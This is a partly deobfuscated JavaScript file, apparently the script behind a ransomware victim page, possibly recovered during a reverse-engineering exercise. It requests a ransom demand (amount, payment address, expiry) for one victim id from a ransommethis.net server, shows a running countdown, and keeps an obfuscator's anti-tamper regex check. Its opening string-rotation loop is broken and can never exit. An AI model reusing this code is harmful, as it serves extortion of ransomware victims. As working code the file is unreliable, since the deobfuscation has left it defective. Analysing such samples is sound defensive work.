(function (strings_fun, target) {
    const strings_array = strings_fun();
    while (true) {
      try {
        if (8081388 === 627318) 
          break; 
        else 
          strings_array.push(strings_array.shift());
      } catch (err) {
        strings_array.push(strings_array.shift());
      }
    }
  }(strings, 627318));
  const _0x7e4f46 = function () {
    let trueVar = true;
    return function (_0xc67c1, pair) {
      const _0x2273e1 = trueVar ? function () {
        if (true) {
          const _0x12aa03 = pair["apply"](_0xc67c1, arguments);
          return pair = null, _0x12aa03;
        }
      } : function () {};
      return trueVar = false, _0x2273e1;
    };
  }(), query = _0x7e4f46(this, function () {
    return query["toString"]()["search"]("(((.+)+)+)+$")["toString"]()["constructor"](query)["search"]("(((.+)+)+)+$");
  });
  
  query();

  let exp_date;

  function function_returns_string_from_array_of_strings(var1) {
    const array_of_strings = strings();
    let val = var1 - 274;
    let index = array_of_strings[val];
    return index;
  }

  function strings() {
    const list_of_strings = [
      "went wrong", // used
      "6oDdlHB", 
      "floor", // used
      "2180TySAAw", 
      "id=78550", // used
      "exp_date", // used
      "11269197esoYJw", 
      "827OkZHjb", 
      "3264PvEPwc", 
      "adqs.ranso", // used
      "something ", // used
      "(((.+)+)+)", 
      "send", // used
      "time", // used
      "toString", // used
      "onload", 
      "amount", // used
      "3471DOFiUP", 
      "594zHuSFa", 
      "round", // used
      "509680hRfXnV", 
      "innerHTML", // used
      "responseTy", // used
      "22759wOKsKF", 
      "56904zdEJIB", 
      "address", // used
      "t/demand?c", // used
      "mmethis.ne", // used
      " days ", 
      "91OsfDRN", 
      "response", // used
      "https://ik", // used
      "ById", // used
      "139908htWnPV", 
      "open", // used
      "GET", // used
      "getElement", // used
      "apply", // used
      "json", // used
      "730mumJHX", 
      "search", // used
      "getTime"]; // used
    return list_of_strings;
  }
  
  var getJSON = function (site_url, _0x564c37) {
    var xmlRequest = new XMLHttpRequest;
    xmlRequest["open"]("GET", site_url, true), xmlRequest["responseType"] = "json", xmlRequest["onload"] = function () {
      var xml_status_var = xmlRequest.status;
      xml_status_var === 200 ? _0x564c37(null, xmlRequest["response"]) : _0x564c37(xml_status_var, xmlRequest.response);
    }, xmlRequest["send"]();
  };
  function connect() {
    return new Promise((_0x351271, _0x58b9fe) => {
      getJSON("https://ikjgazqmvuimadqs.ransommethis.net/demand?cid=78550", function (message, table) {
        message !== null ? alert("something went wrong: " + message) : (_0x351271(table), document["getElementById"]("time").innerHTML = time(table.exp_date), document["getElementById"]("amount")["innerHTML"] = table.amount, document["getElementById"]("address")["innerHTML"] = table["address"], exp_date = table["exp_date"]);
      });
    });
  }
  ;
  function time(time_function_input_parameter) {
    const _0x2c9d7c = Math["round"]((new Date)["getTime"]() / 1e3);
    const _0x3b9139 = 60, _0xa6fcfc = _0x3b9139 * 60, _0x2c07bb = _0xa6fcfc * 24;
    let _0x1226ea = time_function_input_parameter - _0x2c9d7c, _0x4638b0 = Math.floor(_0x1226ea / _0x2c07bb), _0xc105a6 = Math["floor"]((_0x1226ea - _0x4638b0 * _0x2c07bb) / _0xa6fcfc), _0xc9a5da = Math["floor"]((_0x1226ea - _0x4638b0 * _0x2c07bb - _0xc105a6 * _0xa6fcfc) / _0x3b9139);
    _0xc9a5da < 10 && (_0xc9a5da = "0" + _0xc9a5da);
    ;
    let _0x478b46 = Math["floor"](_0x1226ea - _0x4638b0 * _0x2c07bb - _0xc105a6 * _0xa6fcfc - _0xc9a5da * _0x3b9139);
    _0x478b46 < 10 && (_0x478b46 = "0" + _0x478b46);
    ;
    let _0x2bf976 = _0x4638b0 + " days " + _0xc105a6 + ":" + _0xc9a5da + ":" + _0x478b46;
    return _0x2bf976;
  }
  ;
  setInterval(function reload_time() {
    document["getElementById"]("time")["innerHTML"] = time(exp_date);
  }, 1000);
  